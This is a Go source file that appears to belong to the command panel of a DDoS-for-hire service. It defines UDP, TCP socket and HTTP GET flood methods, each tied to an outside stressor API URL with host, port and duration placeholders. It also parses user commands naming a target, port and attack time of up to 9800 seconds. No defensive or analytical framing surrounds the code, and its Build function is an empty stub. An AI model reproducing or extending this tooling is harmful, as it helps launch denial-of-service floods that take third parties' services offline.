package main

import (
	"errors"
	"fmt"
	"github.com/mattn/go-shellwords"
	"strconv"
)

type MethodInfo struct {
	methodId     uint8
	methodApi    string
	methodName   string
	description  string
	layer7Method bool
}

type Attack struct {
	Duration uint32
	Type     uint8
	Target   string
	Port     string
}

var methodInfoLookup map[string]MethodInfo = map[string]MethodInfo{
	"udp": MethodInfo{
		0,
		"https://api.net/api.php?key=key&host=[host]&port=[port]&time=[time]&method=UDP",
		"udp",
		"Simple UDP flood.",
		false,
	},
	"socket": MethodInfo{
		1,
		"https://api.net/api.php?key=key&host=[host]&port=[port]&time=[time]&method=SOCKET",
		"socket",
		"TCP SOCKET flood.",
		false,
	},
	"get": MethodInfo{
		2,
		"https://api.net/api.php?key=key&host=[host]&port=[port]&time=[time]&method=GET",
		"get",
		"Simple httpget method (TLS).",
		true,
	},
}

func uint8InSlice(a uint8, list []uint8) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}

func NewAttack(str string) (*Attack, error) {
	atk := &Attack{0, 0, str, ""}
	args, _ := shellwords.Parse(str)

	var atkInfo MethodInfo
	// Parse attack name
	if len(args) == 0 {
		return nil, errors.New("must specify an attack name")
	} else {
		var exists bool
		atkInfo, exists = methodInfoLookup[args[0]]
		if !exists {
			return nil, errors.New(fmt.Sprintf("\u001B[97mCommand not found"))
		}
		atk.Type = atkInfo.methodId
		args = args[1:]
	}

	// Parse targets
	if len(args) == 0 {
		return nil, errors.New("\033[91mError! \033[97mYou need to specify a prefix/netmask as targets")
	} else {
		if args[0] == "?" {
			return nil, errors.New("IP Address/URL of target")
		}
		atk.Target = args[0]
		args = args[1:]
	}

	// Parse port
	if len(args) == 0 {
		return nil, errors.New("\u001B[91mError! \u001B[97mYou need to specify a port")
	} else {
		if args[0] == "?" {
			return nil, errors.New("\u001B[97mPort of the target, in an integer")
		}
		atk.Port = args[0]
		args = args[1:]
	}

	// Parse attack duration time
	if len(args) == 0 {
		return nil, errors.New("\033[91mError! \033[97mMust specify an attack duration")
	} else {
		// Description of the time
		if args[0] == "?" {
			return nil, errors.New("\u001B[97mDuration of the attack, in seconds")
		}
		// Converting the time
		duration, err := strconv.Atoi(args[0])
		// Check if the time is over the maximum(9800).
		if err != nil || duration == 0 || duration > 9800 {
			return nil, errors.New(fmt.Sprintf("\033[91mError! \033[97mInvalid attack duration, near %s. Duration must be between 0 and 9800 seconds", args[0]))
		}
		// Set the duration
		atk.Duration = uint32(duration)
		args = args[1:]
	}

	return atk, nil
}

func (this *Attack) Build() error {
	return nil
}
